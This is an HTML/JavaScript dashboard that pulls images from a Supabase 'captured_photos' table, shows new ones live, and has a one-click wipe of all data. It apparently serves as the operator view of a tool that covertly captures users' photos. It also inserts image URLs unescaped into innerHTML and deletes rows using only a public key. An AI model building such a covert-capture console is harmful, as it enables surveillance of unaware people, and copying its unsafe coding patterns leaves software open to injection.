<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - Live Feed</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            padding: 20px;
            margin: 0;
        }

        /* Header Styles */
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: white;
            padding: 15px 20px;
            border-radius: 8px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            margin-bottom: 20px;
        }

        h1 { margin: 0; color: #333; font-size: 24px; }

        .delete-btn {
            background-color: #e74c3c;
            color: white;
            border: none;
            padding: 10px 20px;
            font-size: 14px;
            cursor: pointer;
            border-radius: 5px;
            font-weight: bold;
        }

        .delete-btn:hover { background-color: #c0392b; }

        /* Gallery Grid */
        .gallery {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
            gap: 15px;
        }

        .card {
            background: white;
            padding: 10px;
            border-radius: 8px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            text-align: center;
            animation: fadeIn 0.5s;
        }

        .card img {
            width: 100%;
            height: 150px;
            object-fit: cover;
            border-radius: 5px;
            cursor: pointer;
            border: 1px solid #ddd;
        }

        .time {
            display: block;
            margin-top: 5px;
            font-size: 12px;
            color: #777;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
    </style>
</head>
<body>

    <div class="header">
        <h1>Admin Monitor <span id="count">(0)</span></h1>
        <button class="delete-btn" onclick="deleteAllPhotos()">DELETE ALL DATA</button>
    </div>

    <div id="gallery" class="gallery">
        <p style="width:100%; text-align:center; color:gray;">Loading photos...</p>
    </div>

    <script>
        // --- SUPABASE CONFIGURATION ---
        const SUPABASE_URL = 'https://mlcbjfnimbpatmbcgwsq.supabase.co';
        const SUPABASE_KEY = 'sb_publishable_J1WdZTnnDUCBE6bsTf2brQ_qRlXL_1Z';
        
        // Initialize Supabase
        const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

        const gallery = document.getElementById('gallery');
        const countSpan = document.getElementById('count');

        // 1. Fetch Existing Photos on Load
        async function fetchPhotos() {
            const { data, error } = await supabase
                .from('captured_photos')
                .select('*')
                .order('created_at', { ascending: false });

            if (error) {
                console.error("Error fetching:", error);
                gallery.innerHTML = '<p style="color:red; text-align:center;">Error loading data. Check console.</p>';
            } else {
                gallery.innerHTML = ''; // Clear loading text
                data.forEach(photo => displayPhoto(photo));
                updateCount(data.length);
            }
        }

        // 2. Listen for Real-time Updates (New Photos)
        supabase.channel('admin-feed')
            .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'captured_photos' }, payload => {
                console.log('New photo received!');
                displayPhoto(payload.new, true); // Add to top
                
                // Optional: Sound Alert
                // new Audio('https://www.soundjay.com/button/beep-07.wav').play().catch(e=>{});
            })
            .on('postgres_changes', { event: 'DELETE', schema: 'public', table: 'captured_photos' }, payload => {
                // If data is deleted, refresh the list
                fetchPhotos();
            })
            .subscribe();

        // 3. Helper Function to Display a Photo
        function displayPhoto(photo, isNew = false) {
            const div = document.createElement('div');
            div.className = 'card';
            
            const date = new Date(photo.created_at).toLocaleString();

            div.innerHTML = `
                <a href="${photo.image_url}" target="_blank">
                    <img src="${photo.image_url}" alt="User Photo">
                </a>
                <span class="time">${date}</span>
            `;

            if (isNew) {
                gallery.prepend(div);
                // Update count +1
                const currentCount = parseInt(countSpan.innerText.replace(/\D/g,'')) || 0;
                updateCount(currentCount + 1);
            } else {
                gallery.appendChild(div);
            }
        }

        function updateCount(num) {
            countSpan.innerText = `(${num})`;
        }

        // 4. Delete All Function
        async function deleteAllPhotos() {
            if (confirm("Are you sure you want to delete ALL photos? This cannot be undone.")) {
                
                const { error } = await supabase
                    .from('captured_photos')
                    .delete()
                    .neq('id', 0); // Logic to delete all rows

                if (error) {
                    alert("Error deleting: " + error.message);
                } else {
                    gallery.innerHTML = '';
                    updateCount(0);
                    alert("All photos deleted successfully.");
                }
            }
        }

        // Run on startup
        fetchPhotos();

    </script>
</body>
</html>
